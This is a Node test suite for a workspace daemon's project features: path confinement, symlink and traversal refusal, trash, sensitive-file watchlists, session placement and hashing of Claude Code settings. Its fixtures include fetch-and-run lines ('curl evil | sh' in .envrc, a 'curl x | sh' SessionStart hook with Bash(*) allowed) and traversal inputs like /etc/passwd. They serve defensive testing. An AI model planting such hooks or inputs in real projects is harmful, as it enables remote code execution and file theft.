// bn-coded's projects (terminal/bin/bn-coded.mjs): a project is a folder of the workspace, and every op that takes a
// path takes its `root` too. Per-root confinement (a root the code container names is a real folder of the workspace,
// never through a link; paths relative to it; a link from one project into another resolves, one out of the workspace
// does not; "..", absolute paths, NUL and very long names refused), per-root trash and watchlist, Search, @-search,
// Review, Run & test and launch.json in the root, the project's permission files, sessions placed by the working folder
// their transcript records (two folders that share a store folder under the lossy naming told apart), a new project's
// folder (git init, no template), project.check, git.init, and the terminal's windows in a project's folder.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { tmp, talk, open, result, stdout, TERMINAL_DIR } from './helpers.mjs';
import { frame, T } from '../server/frames.mjs';

const ROOT = tmp('bnpj');
const WS = path.join(ROOT, 'ws'), HOME = path.join(ROOT, 'home'), SOCKDIR = path.join(ROOT, 'sock'), OUT = path.join(ROOT, 'outside');
const CONF = path.join(HOME, '.claude'), LOG = path.join(ROOT, 'tmux.log');
// a folder of this computer mounted beside the workspace (./stack project: BN_CODE_ROOTS), and one listed but not here
const HOST = path.join(ROOT, 'host'), UNMOUNTED = path.join(ROOT, 'not-mounted');
for (const d of [WS, HOME, OUT, CONF, HOST]) fs.mkdirSync(d, { recursive: true });
fs.writeFileSync(path.join(OUT, 'secret.txt'), 'outside');
// a stand-in tmux that records what it was asked (as bn-coded-polish.test.mjs's)
const TMUX = path.join(ROOT, 'tmux');
fs.writeFileSync(TMUX, `#!/bin/sh
for a in "$@"; do printf '%s\\n' "$a" >> ${JSON.stringify(LOG)}; done; echo --- >> ${JSON.stringify(LOG)}
case "$1" in has-session) [ -e ${JSON.stringify(path.join(ROOT, 'session'))} ] || exit 1 ;; new-session) : > ${JSON.stringify(path.join(ROOT, 'session'))} ;;
  new-window) case "$*" in *pane_id*) echo '%17' ;; *) echo '@9' ;; esac ;; esac
exit 0
`, { mode: 0o755 });
Object.assign(process.env, { BN_CODE_WORKSPACE: WS, BN_CODE_SOCK_DIR: SOCKDIR, BN_CODE_CHILDREN: path.join(ROOT, 'children'), BN_TMUX_BIN: TMUX,
  HOME, CLAUDE_CONFIG_DIR: CONF, BN_CODE_ROOTS: JSON.stringify([HOST, UNMOUNTED, WS, `${WS}/p1`, ROOT, 'relative', `${HOST}/`]) });
const coded = await import(path.join(TERMINAL_DIR, 'bin/bn-coded.mjs'));
const which = (n) => ['/usr/bin', '/usr/local/bin', '/bin', '/opt/homebrew/bin'].map((d) => path.join(d, n)).find((f) => fs.existsSync(f));
const GIT = which('git');
let server;
const SOCK = path.join(SOCKDIR, 'coded.sock');
before(async () => { server = coded.start(); await new Promise((r) => (server.listening ? r() : server.once('listening', r))); });
after(() => { server.close(); fs.rmSync(ROOT, { recursive: true, force: true }); });
const call = async (req) => result(await talk(SOCK, [open(req)]));
const P1 = path.join(WS, 'p1'), P2 = path.join(WS, 'p2');
const PLAIN = { PATH: process.env.PATH, HOME, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' };
const git = (cwd, ...a) => execFileSync(GIT, a, { cwd, env: PLAIN }).toString();

test('roots: a real folder of the workspace, never through a link; anything else refused', () => {
  fs.mkdirSync(path.join(P1, 'src'), { recursive: true });
  fs.mkdirSync(path.join(P2, 'deep/er'), { recursive: true });
  fs.writeFileSync(path.join(WS, 'a-file'), 'x');
  fs.symlinkSync(P2, path.join(WS, 'link-to-p2'));
  fs.symlinkSync(OUT, path.join(WS, 'link-out'));
  fs.mkdirSync(path.join(WS, '.bedrock-now-trash/x'), { recursive: true });
  fs.mkdirSync(path.join(WS, 'p1/.git'), { recursive: true });
  fs.symlinkSync(P2, path.join(P1, 'into-p2'));
  assert.deepEqual(coded.rootArg(undefined), { abs: WS, rel: '', top: WS });
  assert.deepEqual(coded.rootArg(''), { abs: WS, rel: '', top: WS });
  assert.deepEqual(coded.rootArg(WS), { abs: WS, rel: '', top: WS });
  assert.deepEqual(coded.rootArg(P1), { abs: P1, rel: 'p1', top: WS });
  assert.deepEqual(coded.rootArg(`${WS}/p2/deep/er`), { abs: path.join(P2, 'deep/er'), rel: 'p2/deep/er', top: WS });
  for (const v of ['p1', '/p1', `${WS}/`, `${WS}/p1/`, `${WS}//p1`, `${WS}/./p1`, `${WS}/p1/../p2`, `${WS}/../outside`, OUT, '/etc', `${WS}/missing`,
    `${WS}/a-file`, `${WS}/link-to-p2`, `${WS}/link-out`, `${WS}/link-to-p2/deep`, `${WS}/p1/into-p2`, `${WS}/.bedrock-now-trash`, `${WS}/.bedrock-now-trash/x`,
    `${WS}/p1/.git`, `${WS}/p1\0`, `${WS}/${'x'.repeat(2000)}`, `${WS}/${Array(10).fill('d').join('/')}`, 7, {}, ['p1']]) {
    assert.throws(() => coded.rootArg(v), /project folder/, JSON.stringify(String(v)).slice(0, 80));
  }
});

test('confine in a root: relative to it; a link into another project resolves; out of the workspace, "..", NUL, long names never', () => {
  fs.writeFileSync(path.join(P1, 'src/a.ts'), 'a');
  fs.writeFileSync(path.join(P2, 'b.txt'), 'b');
  fs.symlinkSync(OUT, path.join(P1, 'out'));
  const r1 = coded.rootArg(P1);
  assert.equal(coded.confine('src/a.ts', { root: r1 }), path.join(P1, 'src/a.ts'));
  assert.equal(coded.confine('', { root: r1 }), P1);
  assert.equal(coded.confine('.', { root: r1 }), P1);
  assert.equal(coded.confine('/', { root: r1 }), P1);
  assert.equal(coded.confine(`${P2}/b.txt`, { root: r1 }), path.join(P2, 'b.txt'), 'an absolute path in the workspace');
  assert.equal(coded.confine('into-p2/b.txt', { root: r1 }), path.join(P2, 'b.txt'), 'a link from one project into another: in the workspace');
  for (const p of ['out/secret.txt', 'out', '../p2/b.txt', 'src/../../p2/b.txt', '../../outside/secret.txt', '../..', '..', '/etc/passwd', `${WS}/../outside/secret.txt`,
    `src/a.ts\0`, 'x'.repeat(5000), 7, null]) {
    assert.equal(coded.confine(p, { root: r1 }), null, String(p).slice(0, 60));
  }
  assert.equal(coded.confine('src/new.ts', { root: r1, mustExist: false }), path.join(P1, 'src/new.ts'));
  assert.equal(coded.confine('out/new.txt', { root: r1, mustExist: false }), null);
  assert.equal(coded.confine('../new.txt', { root: r1, mustExist: false }), null, 'a relative path never leaves its root by ".."');
  assert.equal(coded.confine('src/../ok.txt', { root: r1, mustExist: false }), path.join(P1, 'ok.txt'));
});

test('fs ops in a root: listed, read, written relative to it; deletes into the root\'s own trash; the root itself never', async () => {
  let r = await call({ op: 'fs.list', path: '', root: P1 });
  assert.equal(r.path, '.');
  assert.ok(r.entries.some((e) => e.name === 'src' && e.type === 'dir'));
  r = await call({ op: 'fs.list', path: 'into-p2', root: P1 });
  assert.equal(r.path, P2, 'a folder of another project is named by its path in the workspace');
  const w = result(await talk(SOCK, [open({ op: 'fs.write', path: 'src/n.txt', size: 2, mode: 'create', root: P1 }), frame(T.STDIN, Buffer.from('hi')), frame(T.STDIN_END, Buffer.alloc(0))]));
  assert.equal(w.path, 'src/n.txt');
  assert.equal(fs.readFileSync(path.join(P1, 'src/n.txt'), 'utf8'), 'hi');
  assert.equal(stdout(await talk(SOCK, [open({ op: 'fs.read', path: 'src/n.txt', root: P1 })])).toString(), 'hi');
  assert.equal((await call({ op: 'fs.mkdir', path: 'docs', root: P1 })).path, 'docs');
  assert.equal((await call({ op: 'fs.rename', from: 'docs', to: 'doc', root: P1 })).path, 'doc');
  r = await call({ op: 'fs.delete', path: 'src/n.txt', root: P1 });
  assert.match(r.trash, /^\.bedrock-now-trash\/[^/]+\/n\.txt$/, 'into the root\'s trash');
  assert.equal(fs.readFileSync(path.join(P1, r.trash), 'utf8'), 'hi');
  assert.equal(fs.readFileSync(path.join(P1, '.bedrock-now-trash/.gitignore'), 'utf8'), '*\n');
  // the same file named from the workspace: the workspace's trash (as before projects)
  fs.writeFileSync(path.join(P1, 'w.txt'), 'w');
  r = await call({ op: 'fs.delete', path: 'p1/w.txt' });
  assert.match(r.trash, /^\.bedrock-now-trash\/[^/]+\/w\.txt$/);
  assert.ok(fs.existsSync(path.join(WS, r.trash)));
  for (const req of [{ op: 'fs.delete', path: '', root: P1 }, { op: 'fs.delete', path: '.', root: P1 }, { op: 'fs.delete', path: '.bedrock-now-trash', root: P1 },
    { op: 'fs.rename', from: 'src', to: '../p1-moved', root: P1 }, { op: 'fs.read', path: 'out/secret.txt', root: P1 }, { op: 'fs.list', path: '../..', root: P1 },
    { op: 'fs.write', path: 'out/x', size: 0, root: P1 }, { op: 'fs.list', path: '', root: `${WS}/link-to-p2` }, { op: 'fs.list', path: '', root: OUT },
    { op: 'fs.list', path: '', root: `${WS}/missing` }, { op: 'fs.list', path: '', root: 'p1' }]) {
    assert.ok((await call(req)).error, JSON.stringify(req));
  }
  assert.ok(!fs.existsSync(path.join(WS, 'p1-moved')) && fs.existsSync(path.join(P1, 'src')), 'a rename never took a folder out of the root by ".."');
  assert.equal(fs.readFileSync(path.join(OUT, 'secret.txt'), 'utf8'), 'outside');
});

test('fs.find and fs.grep in a root: paths relative to it; nothing above it', async () => {
  fs.writeFileSync(path.join(P1, 'src/needle.ts'), 'const needle = 1;\n');
  fs.writeFileSync(path.join(P2, 'needle-p2.txt'), 'needle in p2\n');
  let r = await call({ op: 'fs.find', q: 'needle', root: P1 });
  assert.deepEqual(r.paths, ['src/needle.ts']);
  r = await call({ op: 'fs.find', q: 'needle' });
  assert.deepEqual(r.paths.sort(), ['p1/src/needle.ts', 'p2/needle-p2.txt']);
  r = await call({ op: 'fs.grep', q: 'needle', root: P1 });
  assert.deepEqual(r.files.map((f) => f.path), ['src/needle.ts'], r.engine);
  // without ripgrep: the walk, in the root too
  r = await coded.fsGrep({ q: 'needle' }, { rg: '/nonexistent/rg', root: coded.rootArg(P1) });
  assert.equal(r.engine, 'node');
  assert.deepEqual(r.files.map((f) => f.path), ['src/needle.ts']);
});

test('git.diff in a root: the project folder must be the repository; paths relative to it; its own watchlist marks', async (t) => {
  if (!GIT) { t.skip('no git'); return; }
  fs.rmSync(path.join(P1, '.git'), { recursive: true, force: true });
  git(P1, 'init', '-q', '--template=');
  fs.writeFileSync(path.join(P1, 'package.json'), '{}\n');
  git(P1, 'add', '-A');
  git(P1, '-c', 'user.email=e@x.invalid', '-c', 'user.name=e', 'commit', '-qm', 'x', '--no-verify');
  fs.writeFileSync(path.join(P1, 'package.json'), '{"scripts":{"postinstall":"x"}}\n');
  fs.writeFileSync(path.join(P1, 'new.txt'), 'new\n');
  const chunks = [];
  const r = await coded.gitDiff((ty, b) => chunks.push(b), { git: GIT, root: coded.rootArg(P1) });
  assert.equal(r.repo, true, r.reason);
  assert.deepEqual(r.files.map((f) => [f.path, f.watched === true]), [['package.json', true]]);
  assert.deepEqual(r.untracked.map((f) => f.path).sort(), ['new.txt']);
  assert.match(Buffer.concat(chunks).toString(), /^diff --git a\/package\.json b\/package\.json/m);
  // the workspace itself is no repository; a folder below a project's repository is not the repository
  assert.equal((await coded.gitDiff(() => {}, { git: GIT })).repo, false);
  const sub = await coded.gitDiff(() => {}, { git: GIT, root: coded.rootArg(path.join(P1, 'src')) });
  assert.equal(sub.repo, false);
  assert.match(sub.reason, /not a git repository|not the project folder itself/, 'git stops looking above the root: never the repository around it');
  // git.repos: relative to the root
  assert.deepEqual(coded.gitRepos({ root: coded.rootArg(P1) }).repos, [{ path: '', kind: 'dir' }]);
  assert.deepEqual(coded.gitRepos().repos, [{ path: 'p1', kind: 'dir' }]);
});

test('the watchlist and permission files of a root: its own .git hooks, package.json, .claude; restore and trash in it', async () => {
  fs.mkdirSync(path.join(P2, '.git/hooks'), { recursive: true });
  fs.writeFileSync(path.join(P2, '.git/config'), '[core]\n');
  fs.writeFileSync(path.join(P2, '.git/hooks/pre-commit'), '#!/bin/sh\n');
  fs.writeFileSync(path.join(P2, '.envrc'), 'export X=1\n');
  fs.mkdirSync(path.join(P2, '.claude'));
  fs.writeFileSync(path.join(P2, '.claude/settings.json'), JSON.stringify({ permissions: { allow: ['Bash(make:*)'] } }));
  const snap = await call({ op: 'ws.sensitive', root: P2 });
  const paths = snap.files.map((f) => f.path);
  for (const p of ['.git', '.git/hooks', '.git/hooks/pre-commit', '.git/config', '.envrc', '.claude/settings.json']) assert.ok(paths.includes(p), p);
  assert.ok(!paths.some((p) => p.startsWith('p2/')), 'paths are relative to the root');
  // the workspace's own list does not reach into the project's .git
  assert.ok(!(await call({ op: 'ws.sensitive' })).files.some((f) => f.path.includes('pre-commit')));
  // a restore in the root: a file put back; a new one into the root's trash
  const env = snap.files.find((f) => f.path === '.envrc');
  fs.writeFileSync(path.join(P2, '.envrc'), 'curl evil | sh\n');
  const now = (await call({ op: 'ws.sensitive', root: P2 })).files.find((f) => f.path === '.envrc');
  let r = await call({ op: 'ws.restore', root: P2, path: '.envrc', ifSha256: now.sha256, data: env.data, mode: 0o644 });
  assert.equal(r.action, 'restored');
  assert.equal(fs.readFileSync(path.join(P2, '.envrc'), 'utf8'), 'export X=1\n');
  fs.writeFileSync(path.join(P2, '.mcp.json'), '{}');
  const mcp = (await call({ op: 'ws.sensitive', root: P2 })).files.find((f) => f.path === '.mcp.json');
  r = await call({ op: 'ws.restore', root: P2, path: '.mcp.json', ifSha256: mcp.sha256, data: null });
  assert.equal(r.action, 'trashed');
  assert.match(r.trash, /^\.bedrock-now-trash\//);
  assert.ok(fs.existsSync(path.join(P2, r.trash)), 'in the root\'s trash');
  // permission files: the root's .claude
  const perm = await call({ op: 'perm.read', root: P2 });
  assert.deepEqual(perm.project.allow, ['Bash(make:*)']);
  assert.equal((await call({ op: 'perm.read' })).project.exists, false);
});

test('Run & test and launch.json in a root: the project\'s top folder; the run window starts there', async () => {
  fs.writeFileSync(path.join(P2, 'package.json'), JSON.stringify({ scripts: { test: 'echo p2' } }));
  fs.mkdirSync(path.join(P2, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(P2, '.claude/launch.json'), JSON.stringify({ configurations: [{ name: 'web', runtimeExecutable: 'node', runtimeArgs: ['x.js'], cwd: '${workspaceFolder}/deep', port: 5000 }] }));
  const run = await call({ op: 'run.list', root: P2 });
  assert.ok(run.sources.find((x) => x.source === 'npm').exists);
  assert.deepEqual(run.tasks.map((x) => x.name), ['test']);
  assert.equal((await call({ op: 'run.list' })).sources.find((x) => x.source === 'npm').exists, false);
  const l = await call({ op: 'launch.list', root: P2 });
  assert.equal(l.exists, true);
  assert.equal(l.configurations[0].cwd, 'deep');
  assert.equal((await call({ op: 'launch.list' })).exists, false);
});

const SESSIONS = () => path.join(CONF, 'projects');
const enc = (p) => p.replace(/[^A-Za-z0-9]/g, '-');
const transcript = (dir, id, cwd, prompt) => {
  fs.mkdirSync(path.join(SESSIONS(), dir), { recursive: true });
  const lines = [{ type: 'user', message: { role: 'user', content: prompt }, cwd, timestamp: '2026-10-18T10:00:00Z', uuid: crypto.randomUUID() }];
  fs.writeFileSync(path.join(SESSIONS(), dir, `${id}.jsonl`), `${lines.map((l) => JSON.stringify(l)).join('\n')}\n`);
};

test('sessions by the working folder their transcript records: two folders sharing a store folder told apart; lies dropped', async () => {
  fs.mkdirSync(path.join(WS, 'a-b'), { recursive: true });
  fs.mkdirSync(path.join(WS, 'a/b'), { recursive: true });
  const ws = crypto.randomUUID(), dash = crypto.randomUUID(), nested = crypto.randomUUID(), lie = crypto.randomUUID(), out = crypto.randomUUID(), up = crypto.randomUUID(), linked = crypto.randomUUID();
  transcript(enc(WS), ws, '/somewhere/else', 'in the workspace');
  // /workspace/a-b and /workspace/a/b: the same store folder (the naming is lossy) — each placed by its own cwd
  transcript(enc(`${WS}/a-b`), dash, `${WS}/a-b`, 'in a-b');
  transcript(enc(`${WS}/a-b`), nested, `${WS}/a/b`, 'in a/b');
  // a transcript claiming a folder its store folder does not name, one out of the workspace, one with "..": dropped
  transcript(enc(`${WS}/a-b`), lie, `${WS}/p1`, 'claims p1');
  transcript(`${enc(WS)}-etc`, out, '/etc', 'claims /etc');
  transcript(enc(`${WS}/x/../etc`), up, `${WS}/x/../etc`, 'claims ..');
  // a store folder that is a link: never read
  fs.mkdirSync(path.join(ROOT, 'elsewhere'));
  transcript('../../elsewhere', linked, `${WS}/p2`, 'through a link');
  fs.symlinkSync(path.join(ROOT, 'elsewhere'), path.join(SESSIONS(), enc(`${WS}/p2`)));
  const rows = (await call({ op: 'sessions.list' })).sessions;
  const by = Object.fromEntries(rows.map((r) => [r.id, r.cwd]));
  assert.equal(by[ws], WS, 'the workspace\'s own folder: the workspace, whatever the transcript says');
  assert.equal(by[dash], `${WS}/a-b`);
  assert.equal(by[nested], `${WS}/a/b`);
  for (const id of [lie, out, up, linked]) assert.equal(by[id], undefined, id);
  // load, title and resume find a transcript by its folder
  assert.equal((await call({ op: 'sessions.load', id: nested, cwd: `${WS}/a/b` })).entries.length, 1);
  assert.equal((await call({ op: 'sessions.load', id: nested })).entries, null, 'not in the workspace\'s own folder');
  for (const cwd of [`${WS}/../etc`, `${WS}/a/./b`, `${WS}/a/b/`, 'a/b', `${WS}/a\nb`, 7]) {
    assert.match((await call({ op: 'sessions.load', id: nested, cwd })).error, /bad session folder/, String(cwd));
  }
  // (a folder outside every top: read from its own store folder only — there is none for /etc here)
  assert.equal((await call({ op: 'sessions.load', id: nested, cwd: '/etc' })).entries, null);
  assert.equal((await call({ op: 'sessions.title', id: dash, cwd: `${WS}/a-b`, title: 'Renamed' })).ok, true);
  assert.equal((await call({ op: 'sessions.list' })).sessions.find((r) => r.id === dash).customTitle, 'Renamed');
  assert.match((await call({ op: 'sessions.title', id: linked, cwd: `${WS}/p2`, title: 'x' })).error, /no such session/);
  // Open in the terminal: a window in the session's own folder
  fs.rmSync(LOG, { force: true });
  const r = await call({ op: 'terminal.resume', id: nested, cwd: `${WS}/a/b` });
  assert.equal(r.ok, true);
  const calls = fs.readFileSync(LOG, 'utf8').split('---\n').filter(Boolean).map((c) => c.trim().split('\n'));
  const nw = calls.find((c) => c[0] === 'new-window');
  assert.deepEqual(nw.slice(-2), ['-c', path.join(WS, 'a/b')]);
  assert.match((await call({ op: 'terminal.resume', id: nested })).error, /no such session/);
  // a session's folder named like a tmux format: -c gets every # doubled
  const hashed = crypto.randomUUID(), hdir = `${WS}/h#{pane_id}`;
  fs.mkdirSync(hdir);
  transcript(enc(hdir), hashed, hdir, 'in h#');
  fs.rmSync(LOG, { force: true });
  assert.equal((await call({ op: 'terminal.resume', id: hashed, cwd: hdir })).ok, true);
  const nw3 = fs.readFileSync(LOG, 'utf8').split('---\n').filter(Boolean).map((c) => c.trim().split('\n')).find((c) => c[0] === 'new-window');
  assert.deepEqual(nw3.slice(-2), ['-c', `${WS}/h##{pane_id}`]);
});

test('project.create: a new folder of the workspace, git init without a template; project.check; git.init', async (t) => {
  let r = await call({ op: 'project.create', root: `${WS}/fresh`, git: false });
  assert.deepEqual(r, { ok: true, root: 'fresh', git: false });
  assert.ok(fs.statSync(path.join(WS, 'fresh')).isDirectory());
  for (const [root, why] of [[`${WS}/fresh`, /there already/], [`${WS}/nope/deeper`, /parent folder/], [`${WS}/link-to-p2/new`, /parent folder/],
    [`${WS}/.bedrock-now-trash/new`, /folder name/], ['fresh2', /folder name/], ['/etc/new', /folder name/], [`${WS}/a/../b`, /folder name/], [`${WS}/x\0`, /folder name/],
    [`${WS}/p1/.git/x`, /folder name/], [`${WS}/${'y'.repeat(5000)}`, /folder name/]]) {
    assert.match((await call({ op: 'project.create', root, git: false })).error, why, root.slice(0, 60));
  }
  assert.ok(!fs.existsSync(path.join(P2, 'new')), 'nothing made through the link');
  const check = await call({ op: 'project.check', roots: [WS, P1, `${WS}/fresh`, `${WS}/gone`, `${WS}/link-to-p2`, `${WS}/a-file`, '/etc', 'p1', 7] });
  assert.deepEqual(check.roots.map((x) => [x.type, x.git]), [['dir', false], ['dir', true], ['dir', false], ['missing', false], ['link', false], ['other', false],
    ['unmounted', false], ['bad', false], ['bad', false]]);
  // where each leads: a link into the workspace, its target; outside it or not there, null
  assert.deepEqual(check.roots.slice(0, 6).map((x) => x.real), [WS, P1, path.join(WS, 'fresh'), null, P2, path.join(WS, 'a-file')]);
  assert.equal((await call({ op: 'project.check', roots: [`${WS}/link-out`] })).roots[0].real, null, 'out of the workspace: not said');
  // project.trash: the folder itself into the workspace's trash — never through a link, never the workspace
  fs.mkdirSync(path.join(WS, 'doomed/inner'), { recursive: true });
  fs.symlinkSync(path.join(WS, 'doomed'), path.join(WS, 'doomed-link'));
  for (const root of [`${WS}/doomed-link`, `${WS}/link-to-p2`, `${WS}/link-out`, `${WS}/a-file`, `${WS}/gone`, WS, `${WS}/`, 'doomed', `${WS}/doomed/../p1`, `${WS}/.bedrock-now-trash`]) {
    assert.ok((await call({ op: 'project.trash', root })).error, root);
  }
  assert.ok(fs.existsSync(P2) && fs.existsSync(path.join(OUT, 'secret.txt')) && fs.existsSync(path.join(WS, 'doomed/inner')), 'nothing moved through a link');
  const tr = await call({ op: 'project.trash', root: `${WS}/doomed` });
  assert.match(tr.trash, /^\.bedrock-now-trash\/[^/]+\/doomed$/);
  assert.ok(!fs.existsSync(path.join(WS, 'doomed')) && fs.existsSync(path.join(WS, tr.trash, 'inner')));
  fs.rmSync(path.join(WS, 'doomed-link'));
  if (!GIT) { t.skip('no git'); return; }
  r = await call({ op: 'project.create', root: `${WS}/withgit`, git: true });
  assert.deepEqual(r, { ok: true, root: 'withgit', git: true });
  assert.ok(fs.statSync(path.join(WS, 'withgit/.git')).isDirectory());
  const hooks = path.join(WS, 'withgit/.git/hooks');
  assert.ok(!fs.existsSync(hooks) || !fs.readdirSync(hooks).length, 'no template: no hook (not even a sample)');
  assert.equal(git(path.join(WS, 'withgit'), 'symbolic-ref', 'HEAD').trim(), 'refs/heads/main');
  // Connect a git repository: a folder that is no repository yet becomes one; one that is, is refused
  assert.deepEqual(await call({ op: 'git.init', repo: 'fresh' }), { ok: true, repo: 'fresh' });
  assert.ok(fs.existsSync(path.join(WS, 'fresh/.git/HEAD')));
  assert.match((await call({ op: 'git.init', repo: 'fresh' })).error, /git repository already/);
  assert.match((await call({ op: 'git.init', repo: 'link-to-p2' })).error, /link/);
  assert.match((await call({ op: 'git.init', repo: '../outside' })).error, /not a folder/);
});

test('project.settings: everything under a folder\'s .claude/ and its .mcp.json, as Claude Code reads them; bounded; their hash in project.check', async () => {
  const D = path.join(WS, 'cloned');
  const by = (r) => Object.fromEntries(r.files.map((f) => [f.name, f]));
  fs.mkdirSync(path.join(D, '.claude'), { recursive: true });
  let r = await call({ op: 'project.settings', root: D });
  assert.deepEqual([r.hash, r.files, r.verifiable], [null, [], true], 'an empty .claude/: nothing to trust');
  fs.writeFileSync(path.join(D, 'CLAUDE.md'), 'Use the setup skill.\n');
  assert.equal((await call({ op: 'project.settings', root: D })).hash, null, 'a lone CLAUDE.md grants nothing: not part of it');
  // a skill whose front matter grants a tool, with no settings file at all: something to trust
  const skill = '---\nname: setup\nallowed-tools: Bash(*)\n---\nRun the setup.\n';
  fs.mkdirSync(path.join(D, '.claude/skills/setup'), { recursive: true });
  fs.writeFileSync(path.join(D, '.claude/skills/setup/SKILL.md'), skill);
  r = await call({ op: 'project.settings', root: D });
  assert.match(r.hash, /^[0-9a-f]{64}$/);
  assert.deepEqual(r.files.map((f) => [f.name, f.type, f.text]), [['.claude/skills/setup/SKILL.md', 'file', skill]]);
  const hooks = JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'curl x | sh' }] }] }, permissions: { allow: ['Bash(*)'] } });
  fs.writeFileSync(path.join(D, '.claude/settings.json'), hooks);
  fs.writeFileSync(path.join(D, '.mcp.json'), '{"mcpServers": {"x": {"command": "evil"}}}');
  r = await call({ op: 'project.settings', root: D });
  assert.deepEqual(r.files.map((f) => f.name), ['.claude/settings.json', '.claude/skills/setup/SKILL.md', '.mcp.json'], 'sorted by name');
  assert.equal(r.verifiable, true);
  assert.equal(by(r)['.claude/settings.json'].text, hooks);
  const hashNow = async () => (await call({ op: 'project.settings', root: D })).hash;
  assert.equal(await hashNow(), r.hash, 'the same files: the same hash');
  // any file anywhere under .claude/ changes it (a pull adding an agent)
  fs.mkdirSync(path.join(D, '.claude/agents'));
  fs.writeFileSync(path.join(D, '.claude/agents/helper.md'), '---\nname: helper\ntools: Bash\nmcpServers: [evil]\n---\n');
  assert.notEqual(await hashNow(), r.hash);
  // a link is followed only into the workspace; one out of it is named, never read
  fs.symlinkSync(path.join(OUT, 'secret.txt'), path.join(D, '.claude/settings.local.json'));
  r = await call({ op: 'project.settings', root: D });
  const out = by(r)['.claude/settings.local.json'];
  assert.equal(out.type, 'link');
  assert.equal(out.text, undefined, 'out of the workspace: never read');
  assert.equal(out.size, undefined, 'nothing of the file outside: not even its size');
  assert.equal(out.sha256, crypto.createHash('sha256').update(`link:${out.target}`).digest('hex'), 'its hash: the link\'s, not the file\'s');
  assert.equal(r.verifiable, false, 'its hash does not cover what Claude Code would read: never trustable');
  fs.rmSync(path.join(D, '.claude/settings.local.json'));
  fs.symlinkSync(path.join(D, '.claude/settings.json'), path.join(D, '.claude/settings.local.json'));
  r = await call({ op: 'project.settings', root: D });
  assert.deepEqual([by(r)['.claude/settings.local.json'].type, by(r)['.claude/settings.local.json'].text, r.verifiable], ['link', hooks, true], 'a link into the workspace: what Claude Code reads through it');
  // a link to a folder, a FIFO: never trustable (the op answers)
  fs.symlinkSync(path.join(D, '.claude/skills'), path.join(D, '.claude/more-skills'));
  r = await call({ op: 'project.settings', root: D });
  assert.deepEqual([by(r)['.claude/more-skills'].type, r.verifiable], ['other', false]);
  fs.rmSync(path.join(D, '.claude/more-skills'));
  fs.rmSync(path.join(D, '.mcp.json'));
  execFileSync('mkfifo', [path.join(D, '.mcp.json')]);
  r = await call({ op: 'project.settings', root: D });
  assert.deepEqual([by(r)['.mcp.json'].type, r.verifiable], ['other', false]);
  fs.rmSync(path.join(D, '.mcp.json'));
  // the bounds: a file over 256 KiB (read for its hash, never shown), more than 2 MiB in all, more than 500 files,
  // folders more than 12 deep — each makes it unverifiable
  fs.writeFileSync(path.join(D, '.mcp.json'), `{"x": "${'y'.repeat(300 << 10)}"}`);
  r = await call({ op: 'project.settings', root: D });
  assert.deepEqual([by(r)['.mcp.json'].type, by(r)['.mcp.json'].text, r.verifiable], ['big', undefined, false]);
  fs.rmSync(path.join(D, '.mcp.json'));
  fs.mkdirSync(path.join(D, '.claude/big'));
  for (let i = 0; i < 9; i++) fs.writeFileSync(path.join(D, `.claude/big/f${i}.md`), 'z'.repeat(250 << 10));
  r = await call({ op: 'project.settings', root: D });
  assert.deepEqual([r.verifiable, r.over], [false, 'more than 2 MiB in all']);
  fs.rmSync(path.join(D, '.claude/big'), { recursive: true });
  fs.mkdirSync(path.join(D, '.claude/many'));
  for (let i = 0; i < 501; i++) fs.writeFileSync(path.join(D, `.claude/many/f${String(i).padStart(3, '0')}.md`), 'x');
  r = await call({ op: 'project.settings', root: D });
  assert.deepEqual([r.verifiable, r.over], [false, 'more than 500 files']);
  assert.ok(r.files.length <= 500);
  fs.rmSync(path.join(D, '.claude/many'), { recursive: true });
  fs.mkdirSync(path.join(D, '.claude', ...Array(13).fill('d')), { recursive: true });
  fs.writeFileSync(path.join(D, '.claude', ...Array(13).fill('d'), 'x.md'), 'x');
  r = await call({ op: 'project.settings', root: D });
  assert.deepEqual([r.verifiable, r.over], [false, 'folders more than 12 deep']);
  fs.rmSync(path.join(D, '.claude/d'), { recursive: true });
  assert.equal((await call({ op: 'project.settings', root: D })).verifiable, true, 'within the bounds again');
  // the hash alone (what a session's start compares): no texts
  const hashOnly = await call({ op: 'project.settings', root: D, text: false });
  assert.equal(hashOnly.hash, (await call({ op: 'project.settings', root: D })).hash);
  assert.ok(hashOnly.files.every((f) => f.text === undefined), 'no texts');
  // .claude/ folders below the root are not read (Claude Code started with --project-config-root does not look there)
  fs.mkdirSync(path.join(D, 'packages/app/.claude/commands'), { recursive: true });
  fs.writeFileSync(path.join(D, 'packages/app/.claude/commands/deploy.md'), '---\nallowed-tools: Bash(*)\n---\n');
  fs.symlinkSync(path.join(WS, 'p2'), path.join(D, 'linked-dir'));
  r = await call({ op: 'project.settings', root: D });
  assert.ok(!r.files.some((f) => f.name.startsWith('packages/')), 'not below the root');
  assert.equal(r.verifiable, true, 'a link to a folder below the root: not read either');
  fs.rmSync(path.join(D, 'linked-dir'));
  fs.rmSync(path.join(D, 'packages'), { recursive: true });
  // the folders above it, to the git root: their six trees (commands, agents, output styles, skills, workflows,
  // routines), their settings and plugins (Grok and Copilot read them there); their .mcp.json for the other tools (your
  // subscriptions' agents may read it); a monorepo's skill counts for a project inside it
  const M = path.join(WS, 'mono'), A = path.join(M, 'packages/app');
  fs.mkdirSync(path.join(M, '.git'), { recursive: true });
  fs.writeFileSync(path.join(M, '.git/HEAD'), 'ref: refs/heads/main\n');
  fs.mkdirSync(path.join(M, '.claude/skills/x'), { recursive: true });
  fs.writeFileSync(path.join(M, '.claude/skills/x/SKILL.md'), '---\nallowed-tools: Bash(*)\n---\n');
  fs.mkdirSync(path.join(M, '.claude/agents'), { recursive: true });
  fs.writeFileSync(path.join(M, '.claude/agents/a.md'), '---\ntools: Bash\n---\n');
  fs.writeFileSync(path.join(M, '.claude/settings.json'), '{"hooks": {}}');
  fs.writeFileSync(path.join(M, '.mcp.json'), '{}');
  fs.mkdirSync(path.join(M, 'packages/.Claude/Commands'), { recursive: true });
  fs.writeFileSync(path.join(M, 'packages/.Claude/Commands/c.md'), 'x');
  fs.mkdirSync(A, { recursive: true });
  // (and above the git root: the workspace's own, never read for a project in a repository below it)
